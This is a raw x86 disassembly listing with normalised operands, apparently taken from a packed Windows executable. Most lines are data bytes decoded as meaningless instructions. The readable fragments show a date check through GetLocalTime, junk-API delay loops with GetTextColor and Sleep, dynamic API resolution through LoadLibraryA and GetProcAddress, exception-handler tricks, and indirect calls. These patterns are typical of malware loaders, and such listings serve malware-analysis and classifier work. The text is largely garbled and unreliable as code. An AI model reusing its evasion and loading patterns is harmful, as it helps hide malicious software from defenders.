push ebp
jb r-xdata
clc
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
add [ eax ] al
jb r-xdata
jb r-xdata
sbb eax 0xb11dd11d
or esp [ eax + 0x28 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ch [ eax + 0xb1d1d13 ]
or [ esi ] eax
sbb [ bx + di + 0x1d ] ecx
cli
in eax dx
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ecx 0x6b849188
mov edi 0x6b84b94a
mov edi 0x6100b48
add eax 0xaf691d1d
0x1f1a676f 0x1d1d
or bh dl
imul edi [ edi - 0x7bc796c0 ] 0x6b
mov edi 0x9688b946
test [ ebx - 0x41 ] ch
inc esp
jb r-xdata
jb r-xdata
xchg ebx eax
jb r-xdata
sbb eax 0x1d3f7a0b
sbb eax 0x72727272
mov dl 0x6f
sbb eax 0x971d721d
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xb48c3ea7
scasd [ edi ]
scasd [ edi ]
or dh ch
add ebx [ 0xffffffffb9bcbd1d ]
and ch ch
in al 0x26
sbb eax 0x36af6f1d
outsd
cmpsd [ esi ] [ edi ]
or ecx [ es : esi + 0x27 ]
sbb eax 0xb41d721d
fisubr [ ecx + 0x3a ]
or ebx [ edi + 0x28 ]
sbb ebx [ 0x7272721d ]
jb r-xdata
xchg edx eax
mov ebp 0x25699088
test [ ebx - 0x59 ] ch
test [ ebx ] 0x37
jb r-xdata
jb r-xdata
nop
nop
push 0x0
in al dx
jb r-xdata
retn
jb r-xdata
popad
and al ah
test [ edi + 0x22 ] ah
in eax dx
xor ax 0x1d06
sbb eax 0x84e055ed
jb r-xdata
or esp [ ecx + 0x32 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cli
and ebx [ 0x7272721d ]
jb r-xdata
out dx eax
loop r-xdata
push es
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
jb r-xdata
pop ebp
jb r-xdata
push ebp
imul ecx [ esi ] 0x69f60e61
adc ah dl
loop r-xdata
imul edi [ edx ] 0x32a76b84
or ecx [ edx + eax + 0x72721d1d ]
jb r-xdata
add [ eax + 0x1d ] cl
sbb eax 0x84bb3c69
imul edi [ edi - 0x7bc596aa ] 0x6b
cmpsd [ esi ] [ edi ]
xor cl [ ebx ]
mov [ edx ] es
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xfa
0x1d22 0xb1d
and ch ch
mov [ fs : eax ] esp
add [ ebx ] dh
jb r-xdata
rcl [ ebp - 0x75 ] 0xec
jb r-xdata
sbb eax 0x72727272
mov ch dl
loopne r-xdata
or ebx [ edi + 0x6f1d1d08 ]
cmpsb [ esi ] [ edi ]
sar dl cl
jb r-xdata
iretd
jb r-xdata
test bl bl
jb r-xdata
jb r-xdata
loop r-xdata
and [ 0x7272721d ] ebx
jb r-xdata
mov ebx 0x920b2267
loop r-xdata
mov [ rw-data ] 0x70ec
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
push 0x0
call GetTextColor
jmp r-xdata
jae r-xdata
or cl [ ebx * 2 + 0x67bb1d1d ]
and ch ch
in eax 0x5d
retn 0x4
in eax dx
mov cl 0xb5
or esi [ esi + 0xb1d1d5b ]
adc [ eax + 0x1d ] ebx
mov ebx 0xba222d1
imul ebp [ edi ] 0x72721d1d
jb r-xdata
sbb edx [ esi + 0x1d ]
cmpsd [ esi ] [ edi ]
push ss
or edx [ ebp + 0x58 ]
sbb eax 0xdb72721d
cdq
fsubp st5
les ecx [ di + 0x1d ]
outsd
mov esp 0xbfbd2569
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x72727272
rcl [ ebp + 0x68 ] 0x72
jb r-xdata
mov ebp esp
jb r-xdata
cli
or [ 0xffffffffd2a66f1d ] bl
mov cl 0x1d
mov ah 0xde
or esp edi
lahf
jb r-xdata
salc
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
mov ah 0xa
test al 0x13
sbb eax 0x6090b1d
or cl [ eax ]
inc esp
sbb eax 0xee26611d
loop r-xdata
mov [ rw-data ] 0x5b8b
nop
mov [ rw-data ] 0x1
or edx [ ecx + 0x4e ]
jb r-xdata
push r-xdata
jb r-xdata
jb r-xdata
xor ch [ edi + 0x67 ]
bound ebx [ edi ]
jb r-xdata
sbb eax 0x6772721d
and cl [ ebx ]
sbb eax 0x721d1d4e
jb r-xdata
sbb eax 0xbb6d008a
mov edx 0x4a130bb5
adc [ 0x7272721d ] ebx
jb r-xdata
sbb eax 0xe70bdeb4
scasw [ edi ]
loop r-xdata
nop
nop
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x1a99
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
sbb eax 0xbb5fab5
jb r-xdata
in eax 0x45
jb r-xdata
xor eax eax
jb r-xdata
bound ebx [ bx ]
jb r-xdata
mov [ rw-data ] 0x3177
nop
push 0x0
call GetTextColor
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
add [ edi + edi * 8 + 0x30 ] ah
jb r-xdata
push ebp
jb r-xdata
pop ds
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x8a0c
jne r-xdata
nop
push 0x0
call GetTextColor
nop
nop
mov eax 0x1fd3a51b
call sub_4026bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
sbb eax 0x441d0bb1
jb r-xdata
mov [ rw-data ] 0x1
jb r-xdata
mov ah 0xe2
inc ebp
add bl al
jmp r-xdata
inc ebp
jb r-xdata
or ebx [ 0x721d1d44 ]
jb r-xdata
jb r-xdata
mov ecx 0x8e
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403174
jae r-xdata
and [ ebx + 0x461bd82d ] al
jb r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
push [ fs : eax ]
jb r-xdata
mov edi 0x721d1d1c
sbb eax 0xb2a691d
jb r-xdata
inc esp
jb r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_40316c
sub eax rw-data
jb r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403658
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub [ rw-data ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
shl [ edx ] 0x1
mov [ 0x1d08ee0b ] al
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1fd39246
jne r-xdata
call sub_403174
add [ edi ] ecx
sbb eax [ esi ]
jb r-xdata
mov [ eax ] esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ah [ edx + 0x1d08ee0b ]
mov [ ebx + ebp * 2 - 0x77474349 ] es
xchg [ ebx ] cl
jb r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
add [ ecx ] al
jb r-xdata
jb r-xdata
cmp [ edx ] cl
sbb eax 0x7272721d
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x89ed
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
nop
jb r-xdata
fcomp [ ebx ]
jb r-xdata
inc ebp
and al 0x85
lodsb [ esi ]
or ah [ edi + 0x11 ]
sbb eax 0x51350b1d
sbb eax 0x7272721d
mov esp 0x1d51740b
sbb eax 0x9f6b1d88
sbb cl [ ebx ]
lea ecx [ edi ]
sbb eax 0xb0b5b41d
pop esp
nop
nop
push 0x12
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
test [ edx ] al
jb r-xdata
inc esi
jb r-xdata
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_458470
mov [ rw-data ] eax
cmp [ rw-data ] 0x15
jbe r-xdata
nop
push 0x0
call sub_4584f0
nop
nop
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
call sub_403174
add [ eax ] al
jb r-xdata
jb r-xdata
imul esp [ esi + edx * 4 + 0x1d22b90a ] 0x1d
mov al [ ebx ]
loopne r-xdata
add [ edx + eax - 0x1b980000 ] 0x1b
inc esi
add al ch
retn 0xfa7c
jb r-xdata
mov [ eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push ebx
or esp [ ebx + 0x721d1d0e ]
jb r-xdata
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
add al [ eax ]
jb r-xdata
imul eax [ edx ] 0x0
add [ eax - 0x17ff9570 ] dl
cli
jle r-xdata
jb r-xdata
add [ eax - 0x1c ] ch
sbb eax [ esi ]
jb r-xdata
push 0x0
call GetTextColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
je r-xdata
[ edx ]
movsb [ edi ] [ esi ]
xchg esi eax
or bh [ ecx - 0x75e2e2de ]
add esp eax
and eax 0xea30b53
sub_45bf97
xchg edi eax
loop r-xdata
imul edi [ edx ] 0xf2bf6b84
sar [ ecx ] 0x1
jb r-xdata
loop r-xdata
sbb eax 0xaf6fb51d
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
jecxz r-xdata
retn 0xe2e2
jb r-xdata
loop r-xdata
push ds
mov ch 0x6f
jb r-xdata
loop r-xdata
loop r-xdata
push cs
jb r-xdata
jb r-xdata
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi + 0x690bbc1e ] 0x721d1d38
xor eax 0xbe31a61
retn 0x1d2a
loop r-xdata
loopne r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
outsd
xchg esi eax
mov [ ecx - 0xb58947c ] al
mov bl 0xb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b294
jne r-xdata
or eax edx
jb r-xdata
fdivr [ edx + 0x6b84b888 ]
jb r-xdata
jge r-xdata
adc eax 0x1d25f00a
sbb eax 0xbf22661
or al 0x6
loop r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
popfd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
cmp [ edx + 0x6b842469 ] dh
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x3e
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub ch [ ecx + 0x2a ]
scasd [ edi ]
jb r-xdata
sbb eax 0x8ae68832
mov edi 0xb76b845e
jb r-xdata
jb r-xdata
or edi [ ebx + 0x2e ]
imul esi [ edi - 0x58947b84 ] 0x48
or eax [ ecx + edi * 8 ]
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x69
xchg edi eax
0x5abf6b84 0x3869
jb r-xdata
cld
imul esp [ esp + eax * 4 ] 0x845ebf6b
imul esi [ edi - 0x60947bde ] 0x28
or esp ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and al 0x84
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov [ eax + 0x3ea76b84 ] bh
outsb
jb r-xdata
mov eax 0x1d044d0b
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ edx + 0x2bb9bcbd ]
jb r-xdata
xor cl dl
cmp [ edi - 0x59 ] ebp
test [ ss : ebx - 0x69 ] ch
imul ebp [ edx ] 0x6b8422d1
mov edi 0xa76b8454
jb r-xdata
and al [ ebx + ebp * 2 - 0x1cf4d761 ]
test [ ebx - 0x49 ] ch
into
mov bh 0x69
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x6b848188
cmpsd [ esi ] [ edi ]
hlt
sbb eax 0x7272721d
jb r-xdata
test [ ebx - 0x41 ] ch
mov dl 0x69
jb r-xdata
jb r-xdata
sub [ ebx ] cl
loop r-xdata
imul edi [ edi - 0x48947ba2 ] 0x22
test [ ebx - 0x61 ] ch
jb r-xdata
push edx
mov ah 0xb2
or edi [ ebp - 0x1e ]
outsd
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
or eax [ edx + 0x3a ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
imul edi [ edi + 0x1aaf6b1e ] 0xb
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
test [ ebx - 0x41 ] ch
mov [ edx + 0x1d3c5c0b ] ah
sbb eax 0x1ea76f72
mov dl 0x1d
push cs
jl r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop edx
imul edi [ eax ] 0x842469b2
jb r-xdata
jb r-xdata
pop esi
jb r-xdata
jecxz r-xdata
sbb eax 0x7272721d
imul edx [ 0x1d25f00a ] 0xf226611d
adc dh [ edx + 0xb4aa76f ]
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx ] ecx
jb r-xdata
loop r-xdata
jb r-xdata
cmp al 0x1d
cmpsd [ esi ] [ edi ]
out dx al
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x6e7745ca ] 0x69
xor al [ ebx + ebp * 2 + 0x6a0b34b7 ]
add [ 0xffffffffa769721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi + 0x6b84b9e0 ] 0xffffffbf
ja r-xdata
jb r-xdata
or ecx [ esi + eax ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
imul esp [ edi + 0x1e5b0b48 ] 0x1d
sbb eax 0x72727272
and ch ch
add [ 0xffffffffaf6fb51d ] bl
cmpsb [ esi ] [ edi ]
imul ecx [ esi ] 0xe0ce0e63
jb r-xdata
jb r-xdata
popad
sbb ah bl
mov al bl
jb r-xdata
jb r-xdata
or ebp [ esi + 0x3c ]
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x1d10d10b
sbb eax 0x35e666ed
sbb eax 0xeaaf691d
leave
sub ch [ eax - 0xe ]
or esp ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
outsd
jb r-xdata
mov edi 0x9f6b8400
jb r-xdata
jb r-xdata
sub al 0x38
jb r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0x1d3a420b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or esi [ edi - 0x10 ]
jb r-xdata
jb r-xdata
or esp [ edi - 0x4ae2e2d8 ]
mov ch 0xb5
fisubr [ ebx ]
sbb eax 0xb22d11d
mul dl
fldenv [ esi + edx * 8 + 0x28b867ed ]
mov edx 0x32699188
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
push es
jb r-xdata
or ebx [ ebx + 0x1e ]
sbb eax 0x7272721d
jb r-xdata
mov bh 0x7c
jb r-xdata
jb r-xdata
loop r-xdata
arpl [ esi ] cx
sbb eax 0x1eaf6fb5
jb r-xdata
mov edx 0x6b84b888
jb r-xdata
or dh al
jb r-xdata
jb r-xdata
jb r-xdata
dec edx
jb r-xdata
jb r-xdata
jb r-xdata
push ss
test [ ebx - 0x61 ] ch
jb r-xdata
jb r-xdata
sbb eax 0xa3a66f1d
jb r-xdata
rcr [ 0xffffffffa2b76b84 ] 0x1
imul edi [ edi - 0x60947c00 ] 0x16
jb r-xdata
jb r-xdata
or ebp [ eax + edi ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa769721d
mov [ ecx + 0x6b843269 ] dl
mov bh 0x34
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec eax
jb r-xdata
in al 0xe2
push ebp
mov cl 0xb4
popad
lahf
push ds
loop r-xdata
outsd
jb r-xdata
or eax [ ecx + edi * 8 ]
mov eax 0x3ea76b84
jb r-xdata
and eax 0x26611d1d
or ecx [ esi + eax ]
sub esp [ ecx ]
jb r-xdata
jb r-xdata
and ah dh
jb r-xdata
jb r-xdata
or esp [ edx + ecx ]
jb r-xdata
lahf
jb r-xdata
test [ ebx - 0x41 ] ch
push es
mov [ ebp + 0x1d382c0b ] al
sbb eax 0x7272721d
outsd
jb r-xdata
loop r-xdata
add [ ebx + ebp * 2 + 0x1dd1169f ] al
test [ ebx - 0x49 ] ch
mov [ 0x30d13a69 ] al
or edx ebp
jb r-xdata
jb r-xdata
sbb al 0xb
cmp [ 0xffffffffa3a66f1d ] bl
jb r-xdata
or ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
or al [ 0xffffffffb41d1d27 ]
jb r-xdata
jb r-xdata
jb r-xdata
salc
jb r-xdata
jb r-xdata
or ebp [ edx + 0x1 ]
imul esi [ edx ] 0x34b76b84
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
mov [ 0x2bb9bcbd ] al
jb r-xdata
jb r-xdata
ja r-xdata
and ch ch
imul edi [ edx ] 0x3d0b1d67
imul esp [ ebx ] 0xb306784
jpo r-xdata
popad
and al ah
popad
or ah al
and cl [ bp + di ]
imul edi [ ebx ] 0x1d
sbb eax 0xf355ed72
mov cl 0xb4
jb r-xdata
or eax [ esi + 0x8 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
xchg edi eax
out dx al
or cl [ edx ]
sub bl [ 0xffffffffee26611d ]
and cl [ bp + di ]
inc esi
or [ 0x7272721d ] bl
imul sp cx 0xe2e2
sbb eax 0x1db21e97
jb r-xdata
imul esp [ edi - 0x6fbf4c2 ] 0xffffffe2
loop r-xdata
or ecx [ es : esi + eax ]
jb r-xdata
or [ ecx ] 0xffffffb5
inc esp
jb r-xdata
sbb eax 0x7272721d
sbb ch [ ecx + 0x32 ]
test [ ebx - 0x41 ] ch
mov edx 0x14a76b84
shl [ edx ] 0x1
mov [ esi + 0x1d039f0b ] ah
sbb eax 0xedeb1861
jmp r-xdata
or bl [ 0xffffffffed72721d ]
jb r-xdata
jb r-xdata
mov [ 0x2a480b1c ] eax
jb r-xdata
imul edi [ edx ] 0xd50b30d1
imul ebx [ edi - 0x7be22eea ] 0x6b
mov bh 0xa2
jb r-xdata
jb r-xdata
sbb eax 0x1ca3a66f
jb r-xdata
push es
movsb [ edi ] [ esi ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov cl [ edi ]
sbb [ ecx + 0x316a0b74 ] eax
sbb eax 0x7272721d
jb r-xdata
sub al 0x1d
sbb eax 0x1d2b500a
sbb eax 0x14671269
in eax dx
daa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
jb r-xdata
imul ebx [ edx ] 0x6b843269
jb r-xdata
enter 0x1d2a 0x1d
jb r-xdata
mov eax [ 0xbe2e2ea ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov cl [ ecx - 0x4b5f5f18 ]
loop r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
jb r-xdata
sbb eax 0x86ad378a
shl [ ebp + 0x1d3e650b ] 0x1d
jb r-xdata
or [ ebp + 0x1d3cdb0a ] esi
jb r-xdata
mov al [ eax + 0x44 ]
out dx al
sub esp [ ecx ]
jb r-xdata
sbb eax 0x66ed7272
jmp 0x1e28a721
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
ror [ eax + 0x21d60b86 ] 0x1
sbb eax 0x8872721d
sar [ ebx + 0x2369c788 ] 0x84
or ecx [ eax + 0x2a ]
jb r-xdata
imul edi [ edi + 0xb858806 ] 0x2c
cmpsb [ esi ] [ edi ]
jb r-xdata
in eax dx
fucomp st3
loop r-xdata
or dl [ eax + 0x2b ]
or esi [ edi ]
add eax 0xb41d1d27
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x6712691d
adc al 0xed
sbb eax 0x2c370bb4
sbb eax 0x2b500a1d
test [ ebx - 0x41 ] ch
test [ ebx - 0x49 ] ch
xor al 0xb
push 0x1
imul esp [ ebx ] 0x36a76b84
jb r-xdata
mov [ edi + 0x26af6b84 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xb367ed1e
mov eax 0xdb1d1d28
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
mov edx 0x32699188
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
lodsb [ esi ]
loope r-xdata
jb r-xdata
jb r-xdata
or bl bl
jb r-xdata
jb r-xdata
mov bl cl
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
salc
jb r-xdata
sbb eax 0xa2b76b84
mov eax 0xd0b76b84
mov [ esi + 0x1d21d60b ] al
sbb eax 0xc0887272
mov ebx 0x2369c788
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or esi edx
jb r-xdata
out 0x88 al
aam 0xb9
test [ ebx - 0x41 ] ch
test [ ebx - 0x59 ] ch
xor al 0xd1
and cl [ ebx ]
cmp [ 0x7272721d ] bl
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
push edx
xor eax 0x72721d1d
jb r-xdata
imul edi [ edi - 0x50947bb0 ] 0x24
mov [ ebx - 0x1d061df5 ] cl
loop r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov ch 0xa
jb r-xdata
sbb eax 0x1ebfdb1d
fldenv [ esi + edx * 8 + 0x28b867ed ]
xchg ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
in al 0x88
salc
mov edi 0x6b84b9e0
mov edi 0xb9d488e6
jb r-xdata
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0x1d01690a
sbb eax 0x69f22661
cmp ah [ edi + 0x1d ]
or edi [ 0xffffffffed1d1d38 ]
loop r-xdata
test cl bl
sub eax 0xe2e467ed
and eax 0xe2e31ea7
xor cl [ eax - 0x2d1d751a ]
jb r-xdata
cmp al 0x1d
jb r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0xe2e9130b
loop r-xdata
mov dl 0xa
std
add ebx [ 0xffffffffee26611d ]
jb r-xdata
jb r-xdata
mov eax 0xdb1d1d28
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c959 ]
sub [ 0xffffffff971db21d ] bl
fstp [ edi - 0x4c9812e2 ]
jb r-xdata
jb r-xdata
imul esi [ edi - 0x1af447fa ] 0xf
sbb eax 0x7272721d
and [ 0x22d1721d ] ebx
jb r-xdata
push es
or edx [ ebx + 0x5 ]
jb r-xdata
push cs
sbb eax 0x7272721d
jb r-xdata
imul edi [ es : 0x52bf6b84 ] 0x84bb3a69
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fstp [ ebx - 0x52c875e3 ]
jb r-xdata
mov eax [ 0xffffffffffffe2ea ]
jb r-xdata
mov ecx 0xeabf6b84
mov ecx 0xe6bf6b84
mov ah dl
mov ecx 0xe4bf6b84
mov dh dl
jb r-xdata
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x41 ] ch
cmp al [ ebx + ebp * 2 + 0x39d1f2bf ]
cmpsd [ esi ] [ edi ]
mov dl 0x6f
jb r-xdata
jb r-xdata
popad
push cs
out dx al
mov cl 0xb5
and ch ch
inc bp
add bl [ 0x2aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh [ esi - 0x10 ]
loop r-xdata
pop ax
jb r-xdata
pop esi
loop r-xdata
jb r-xdata
or eax esp
jb r-xdata
adc al 0xed
jb r-xdata
push 0xffcf
sbb eax 0x1269311d
xchg ebx eax
push ds
or esp ecx
shl dl 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
mov cl 0xb2
sbb eax 0x88ee2661
loop r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
sub [ 0x1ebfdb1d ] bl
jb r-xdata
push ds
jb r-xdata
sbb eax 0x2bd186b4
sbb eax 0xbc22d172
sub esp [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax dx
push ds
adc [ 0x7221bc1d ] ebx
jb r-xdata
imul edi [ 0x52bf6b84 ] 0x84bb3a69
jb r-xdata
jb r-xdata
imul ebp [ edi - 0x7bc296da ] 0x6b
jb r-xdata
jb r-xdata
xchg al al
mov ch 0xb
sbb eax 0x7272721d
sbb eax 0xad378a1d
jb r-xdata
0xc80be2e2 0x1d2a
jb r-xdata
push esp
test [ ebx - 0x59 ] ch
mov [ ebx + ebp * 2 + 0x6f0b06b7 ] es
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
sbb [ 0x1db4b21d ] ebx
mov ch 0xb2
mov ebp 0x72212bbc
jb r-xdata
push ds
mov esp 0x1d38690b
sbb eax 0x96676f72
xchg esp eax
mov dl 0xb1
sbb eax 0xe2e26275
jb r-xdata
or dl ah
imul ecx [ esi ] 0x1d0a4c0b
or ch [ ebx ]
sbb [ 0xdb88a1d ] bl
and ch ch
dec edx
or al [ ebp - 0x10 ]
loop r-xdata
outsd
scasd [ edi ]
cmp ch [ edi - 0x59 ]
and cl [ bp + di ]
test dl bl
loop r-xdata
loop r-xdata
xor eax 0xa4e2e2d4
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xd1
and cl [ eax + 0x39f0ba6 ]
sbb eax 0xeb18611d
loop r-xdata
jb r-xdata
shl dl 0x1
jb r-xdata
test [ ebx - 0x51 ] ch
push ds
mov bl [ esi + 0x39 ]
jb r-xdata
salc
jb r-xdata
jb r-xdata
push edx
in al 0xe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov bl 0x28
sbb eax 0xed1ebfdb
jb r-xdata
jb r-xdata
loop r-xdata
mul dl
jb r-xdata
mov esp 0x7272212b
shl [ edx ] 0x1
popad
sbb bl [ 0xb2377ed ]
iretd
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
add ebx [ 0xfffffffff6280b1d ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
adc [ 0xb72721d ] bl
sbb eax 0x26551d1d
jb r-xdata
add eax 0x551d1d1d
jb r-xdata
jb r-xdata
jb r-xdata
push eax
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
and al 0x88
mov ecx [ ebx ]
loop r-xdata
scasd [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov dh [ edi ]
lodsd [ esi ]
sbb eax 0x72727272
mov bh 0x69
push cs
or ecx [ edx + ecx + 0x1d ]
loop r-xdata
mov edi 0x843c69ea
imul edi [ edi + 0x1ac60be8 ] 0x1d
jb r-xdata
jb r-xdata
or esp [ edx ]
fsubrp st0
loop r-xdata
jb r-xdata
jb r-xdata
dec ecx
jb r-xdata
inc ebp
mov bh 0x69
push cs
or edx [ ebx ]
jmp 0xffffffff93638aa2
or ebp [ esi + 0x721d1d03 ]
jb r-xdata
imul ebx [ edx ] 0x66ed1d67

mov dl dh
popad
out dx al
or edx [ edx - 0x1c ]
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0x1d15d60b ] al
loop r-xdata
iretd
jb r-xdata
loop r-xdata
jb r-xdata
